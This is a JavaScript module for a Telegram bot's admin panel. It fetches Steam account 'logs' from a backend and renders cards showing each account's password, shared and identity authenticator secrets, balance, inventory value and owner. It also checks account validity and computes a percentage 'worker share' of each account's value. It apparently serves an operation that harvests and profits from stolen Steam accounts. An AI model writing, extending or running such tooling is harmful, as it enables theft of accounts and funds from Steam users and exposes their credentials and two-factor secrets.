const { Markup } = require("telegraf");
const { getSteamAccountById, getSteamAccounts, createCheckValidTask, getSteamTaskById, getSteamInventory } = require("./steamApiService");
const { renderSteamLogImage } = require("../utils/steamLogImageRenderer");
const { renderSteamProfitImage } = require("../utils/steamImageRenderer");
const { env } = require("../config/env");
const { pe, btn } = require("../utils/emoji");
const { logger } = require("../utils/logger");

const KIND_LABELS = {
  valid: "Валид",
  mafile: "MaFile",
  invalid: "Невалид",
  other: "Другое",
  "": "—",
};

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

function classifyAccountLog(row) {
  if (row?.isMaFile === true || /mafile/i.test(String(row?.status || ""))) return "mafile";
  const status = String(row?.status || "");
  if (/^(ok|valid|валид)$/i.test(status) && !row?.invalidDate) return "valid";
  if (/невалид|invalid/i.test(status)) return "invalid";
  return "other";
}

function escapeHtml(value) {
  return String(value ?? "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

function money(value) {
  const n = Number(value);
  if (!Number.isFinite(n)) return "—";
  return `$${n.toFixed(2)}`;
}

function formatDate(value) {
  if (value == null || value === "") return "—";
  if (typeof value === "number") {
    const ms = value > 1e12 ? value : value * 1000;
    const d = new Date(ms);
    if (Number.isNaN(d.getTime())) return String(value);
    return d.toLocaleString("ru-RU");
  }
  const d = new Date(value);
  if (Number.isNaN(d.getTime())) return String(value);
  return d.toLocaleString("ru-RU");
}

/** Средние пункты — ┠, последний — ┖ */
function treeBlock(items) {
  const list = (items || []).filter((v) => v != null && String(v).length);
  return list.map((item, idx) => {
    const branch = idx === list.length - 1 ? "┖" : "┠";
    return `${branch} ${item}`;
  });
}

function unwrapAccount(payload) {
  if (!payload || typeof payload !== "object") return null;
  if (payload.id != null || payload.steamInfo || payload.username) return payload;
  if (payload.data && typeof payload.data === "object") return unwrapAccount(payload.data);
  if (payload.row && typeof payload.row === "object") return unwrapAccount(payload.row);
  if (payload.account && typeof payload.account === "object") return unwrapAccount(payload.account);
  return null;
}

async function fetchSteamAccountById(accountId) {
  const id = String(accountId || "").trim();
  if (!/^\d+$/.test(id)) {
    throw new Error("ID лога должен содержать только цифры.");
  }

  try {
    const raw = await getSteamAccountById(null, id);
    const account = unwrapAccount(raw);
    if (account) return account;
  } catch (error) {
    logger.warn("getSteamAccountById failed, fallback list", id, error.message);
  }

  for (let offset = 0; offset < 500; offset += 50) {
    const payload = await getSteamAccounts(null, { offset, limit: 50 });
    const rows = payload?.rows || payload?.data || [];
    if (!Array.isArray(rows) || !rows.length) break;
    const found = rows.find((row) => String(row.id) === id);
    if (found) return found;
    if (rows.length < 50) break;
  }

  throw new Error(`Лог #${id} не найден в панели.`);
}

async function listSteamAccountsForAdmin({ offset = 0, limit = 30, filter = "" } = {}) {
  const payload = await getSteamAccounts(null, { offset, limit: Math.min(50, Math.max(1, limit)) });
  let rows = payload?.rows || payload?.data || [];
  if (!Array.isArray(rows)) rows = [];
  const q = String(filter || "").trim().toLowerCase();
  if (q) {
    rows = rows.filter((row) => {
      const hay = [
        row.id,
        row.username,
        row.steamInfo?.steamid,
        row.steamInfo?.nickname,
        row.owner?.telegram,
        row.owner?.username,
        row.status,
      ]
        .map((v) => String(v || "").toLowerCase())
        .join(" ");
      return hay.includes(q) || String(row.id) === q;
    });
  }
  return rows.slice(0, limit);
}

function kindLabel(account) {
  return KIND_LABELS[classifyAccountLog(account)] || "—";
}

function accountTotalUsd(account) {
  const balance =
    account?.steamInfo?.balanceUsd != null
      ? Number(account.steamInfo.balanceUsd)
      : Number(account?.steamInfo?.balance || 0);
  const inventory = Number(account?.inventory?.price?.total ?? account?.accountPrice ?? 0);
  return Number(((Number.isFinite(balance) ? balance : 0) + (Number.isFinite(inventory) ? inventory : 0)).toFixed(2));
}

function buildAdminLogCardHtml(account) {
  const steam = account?.steamInfo || {};
  const inv = account?.inventory?.price || {};
  const owner = account?.owner || {};
  const games = Array.isArray(account?.gamesInfo) ? account.gamesInfo.filter(Boolean) : [];
  const id = account?.id ?? "—";
  const login = account?.username || steam.nickname || "—";
  const lines = [];

  lines.push(`${pe("package")} <b>Лог #${escapeHtml(id)}</b>`);
  lines.push(
    ...treeBlock([
      `Тип: <b>${escapeHtml(kindLabel(account))}</b>`,
      `Статус панели: <code>${escapeHtml(account?.status || "—")}</code>`,
    ])
  );

  const accountRows = [`Логин: <code>${escapeHtml(login)}</code>`];
  if (account?.password) accountRows.push(`Пароль: <code>${escapeHtml(account.password)}</code>`);
  if (account?.sharedSecret || account?.shared_secret) {
    accountRows.push(
      `Shared secret: <code>${escapeHtml(account.sharedSecret || account.shared_secret)}</code>`
    );
  }
  if (account?.identitySecret || account?.identity_secret) {
    accountRows.push(
      `Identity secret: <code>${escapeHtml(account.identitySecret || account.identity_secret)}</code>`
    );
  }
  accountRows.push(`Steam ID: <code>${escapeHtml(steam.steamid || "—")}</code>`);
  accountRows.push(`Ник Steam: ${escapeHtml(steam.nickname || "—")}`);
  accountRows.push(
    `Уровень: ${steam.level != null && steam.level !== "" ? escapeHtml(steam.level) : "—"}`
  );
  accountRows.push(`Последняя активность: ${escapeHtml(formatDate(steam.lastPlayed))}`);
  if (steam.profileUrl || steam.url) {
    accountRows.push(`Профиль: ${escapeHtml(steam.profileUrl || steam.url)}`);
  }
  if (steam.country || steam.loccountrycode) {
    accountRows.push(`Страна: ${escapeHtml(steam.country || steam.loccountrycode)}`);
  }

  lines.push("");
  lines.push(`${pe("profile")} <b>Аккаунт</b>`);
  lines.push(...treeBlock(accountRows));

  const economyRows = [
    `Общая сумма: <b>${money(accountTotalUsd(account))}</b>`,
    `Баланс: ${
      steam.balanceUsd != null
        ? money(steam.balanceUsd)
        : steam.balance != null
          ? `${escapeHtml(steam.balance)}${steam.balanceCurrency ? ` ${escapeHtml(steam.balanceCurrency)}` : ""}`
          : "—"
    }`,
    `Инвентарь: ${money(inv.total ?? account?.accountPrice)}`,
  ];
  if (inv.locked != null && Number(inv.locked) > 0) {
    economyRows.push(`Лок инвентаря: ${money(inv.locked)}`);
  }
  if (inv.lockedDate) economyRows.push(`Дата лока: ${escapeHtml(formatDate(inv.lockedDate))}`);
  if (account?.accountPrice != null) {
    economyRows.push(`Account price: ${money(account.accountPrice)}`);
  }

  lines.push("");
  lines.push(`${pe("coins")} <b>Экономика</b>`);
  lines.push(...treeBlock(economyRows));

  const ownerRows = [
    `Telegram: <code>${escapeHtml(owner.telegram || "—")}</code>`,
    `Панель: <code>${escapeHtml(owner.username || "—")}</code>`,
  ];
  if (owner.id != null) ownerRows.push(`Owner ID: <code>${escapeHtml(owner.id)}</code>`);

  lines.push("");
  lines.push(`${pe("users")} <b>Владелец</b>`);
  lines.push(...treeBlock(ownerRows));

  const metaRows = [];
  if (account?.isMaFile != null) metaRows.push(`MaFile: <b>${account.isMaFile ? "да" : "нет"}</b>`);
  if (account?.invalidDate) metaRows.push(`Invalid date: ${escapeHtml(formatDate(account.invalidDate))}`);
  if (account?.createdAt || account?.created_at) {
    metaRows.push(`Создан: ${escapeHtml(formatDate(account.createdAt || account.created_at))}`);
  }
  if (account?.updatedAt || account?.updated_at) {
    metaRows.push(`Обновлён: ${escapeHtml(formatDate(account.updatedAt || account.updated_at))}`);
  }
  if (account?.domain || account?.domainId) {
    metaRows.push(`Домен: <code>${escapeHtml(account.domain || account.domainId)}</code>`);
  }
  if (account?.link || account?.path) {
    metaRows.push(`Ссылка/path: <code>${escapeHtml(account.link || account.path)}</code>`);
  }
  if (metaRows.length) {
    lines.push("");
    lines.push(`${pe("file")} <b>Мета</b>`);
    lines.push(...treeBlock(metaRows));
  }

  if (games.length) {
    const gameRows = games.slice(0, 12).map((game) => {
      const name = game.name || `app ${game.appid || "?"}`;
      const hours = game.playtime != null ? ` · ${Number(game.playtime).toFixed(0)} мин` : "";
      return `${escapeHtml(name)}${escapeHtml(hours)}`;
    });
    if (games.length > 12) gameRows.push(`…и ещё ${games.length - 12}`);
    lines.push("");
    lines.push(`${pe("package")} <b>Игры (${games.length})</b>`);
    lines.push(...treeBlock(gameRows));
  }

  const known = new Set([
    "id",
    "username",
    "password",
    "sharedSecret",
    "shared_secret",
    "identitySecret",
    "identity_secret",
    "status",
    "isMaFile",
    "invalidDate",
    "steamInfo",
    "inventory",
    "owner",
    "gamesInfo",
    "accountPrice",
    "createdAt",
    "created_at",
    "updatedAt",
    "updated_at",
    "domain",
    "domainId",
    "link",
    "path",
  ]);
  const extras = [];
  for (const [key, value] of Object.entries(account || {})) {
    if (known.has(key)) continue;
    if (value == null || typeof value === "object") continue;
    extras.push(`${escapeHtml(key)}: <code>${escapeHtml(value)}</code>`);
  }
  if (extras.length) {
  }

  return lines.join("\n");
}

function buildAdminLogInlinePreviewHtml(account) {
  const id = account?.id ?? "—";
  const login = account?.username || account?.steamInfo?.nickname || "—";
  return [
    `${pe("package")} <b>Лог #${escapeHtml(id)}</b>`,
    ...treeBlock([
      `${escapeHtml(login)} · ${escapeHtml(kindLabel(account))}`,
      money(accountTotalUsd(account)),
    ]),
    "",
    `<i>Загрузка полной карточки…</i>`,
  ].join("\n");
}

function buildAdminLogShortCaption(account) {
  const id = account?.id ?? "—";
  const login = account?.username || account?.steamInfo?.nickname || "—";
  return [
    `${pe("package")} <b>Лог #${escapeHtml(id)}</b>`,
    ...treeBlock([
      `${escapeHtml(login)} · ${escapeHtml(kindLabel(account))}`,
      money(accountTotalUsd(account)),
    ]),
  ].join("\n");
}

function buildAdminLogCardKeyboard(account, backTo = "admin:logs") {
  const rows = [];
  if (classifyAccountLog(account) === "mafile" && account?.id != null) {
    rows.push([btn("→", `admin:log:mafile:${account.id}`, "download")]);
  }
  rows.push([btn("Назад", backTo, "home")]);
  rows.push([btn("В админ-панель", "admin:panel", "code")]);
  return Markup.inlineKeyboard(rows);
}

async function buildAdminLogPhoto(account) {
  try {
    return await renderSteamLogImage(account);
  } catch (error) {
    logger.warn("admin log image failed", error.message);
    return null;
  }
}

function topItems(inventory) {
  return (inventory?.inventories || [])
    .flatMap((group) => group.items || [])
    .map((item) => ({
      icon: item.icon || item.icon_url || item.iconUrl || "",
      itemHashName:
        item.itemHashName || item.market_hash_name || item.hash_name || item.name || "Unknown item",
      price: Number(item.price || 0),
    }))
    .filter((item) => item.price > 0)
    .sort((a, b) => b.price - a.price)
    .slice(0, 7);
}

async function waitTaskDone(taskId) {
  const started = Date.now();
  let result;
  while (Date.now() - started < Math.max(10000, env.steamTaskMaxWaitMs)) {
    result = await getSteamTaskById(taskId);
    if (["Done", "Failed", "Error"].includes(result?.state)) break;
    await sleep(Math.max(1000, env.steamTaskPollIntervalMs));
  }
  return result;
}

/**
 * Пикча MaFile (инвентарь / профит-карточка) для админ-просмотра.
 */
async function buildAdminMaFilePhoto(account) {
  const steamId = String(account?.steamInfo?.steamid || account?.id || "");
  let inventory = null;
  let total = Number(account?.inventory?.price?.total || account?.accountPrice || 0);

  try {
    const task = await createCheckValidTask(account.id || steamId);
    const result = task?.id ? await waitTaskDone(task.id) : task;
    if (result?.state === "Done") {
      const sid = String(result?.steam?.steamid || result?.result?.steam?.steamid || steamId);
      inventory = await getSteamInventory(sid);
      total = Number(inventory?.price?.total || total);
    }
  } catch (error) {
    const msg = String(error?.message || error || "");
    // 404 / missing account — ожидаемо для части логов, не шумим.
    if (!/\b404\b/i.test(msg) && !/not found/i.test(msg)) {
      logger.warn("admin mafile enrich failed", account?.id, msg);
    }
  }

  // Если CheckValid не дал инвентарь — пробуем напрямую по steamId.
  if (!inventory && steamId) {
    try {
      inventory = await getSteamInventory(steamId);
      total = Number(inventory?.price?.total || total);
    } catch (_) {
      /* ignore */
    }
  }

  const pct = Math.max(1, Math.min(100, env.steamWorkerPercent));
  const workerShare = Number((Math.max(0, total) * pct / 100).toFixed(2));
  const items = inventory ? topItems(inventory) : [];
  return renderSteamProfitImage({ items, total, workerShare });
}

/**
 * Отправка админ-карточки лога: пикча + полный текст (с учётом лимитов Telegram).
 */
async function sendAdminLogCard(telegram, chatId, account, extra = {}) {
  const fullHtml = buildAdminLogCardHtml(account);
  const imageBuffer = await buildAdminLogPhoto(account);
  const keyboard =
    extra.reply_markup || buildAdminLogCardKeyboard(account).reply_markup;

  let photoMsg = null;
  if (imageBuffer) {
    const useFullAsCaption = fullHtml.length <= 1024;
    photoMsg = await telegram.sendPhoto(
      chatId,
      { source: imageBuffer, filename: `steam-log-${account?.id || "x"}.png` },
      {
        caption: useFullAsCaption ? fullHtml : buildAdminLogShortCaption(account),
        parse_mode: "HTML",
        // Стрелка MaFile должна быть именно на пикче.
        reply_markup: keyboard,
      }
    );
    if (useFullAsCaption) return photoMsg;
  }

  const chunks = [];
  if (fullHtml.length <= 4000) {
    chunks.push(fullHtml);
  } else {
    let rest = fullHtml;
    while (rest.length) {
      chunks.push(rest.slice(0, 3900));
      rest = rest.slice(3900);
    }
  }

  let last = photoMsg;
  for (let i = 0; i < chunks.length; i += 1) {
    last = await telegram.sendMessage(chatId, chunks[i], {
      parse_mode: "HTML",
      reply_markup: !photoMsg && i === chunks.length - 1 ? keyboard : undefined,
    });
  }
  return last;
}

module.exports = {
  fetchSteamAccountById,
  listSteamAccountsForAdmin,
  buildAdminLogCardHtml,
  buildAdminLogInlinePreviewHtml,
  buildAdminLogPhoto,
  buildAdminLogShortCaption,
  buildAdminLogCardKeyboard,
  buildAdminMaFilePhoto,
  sendAdminLogCard,
  accountTotalUsd,
  kindLabel,
  classifyAccountLog,
  treeBlock,
};
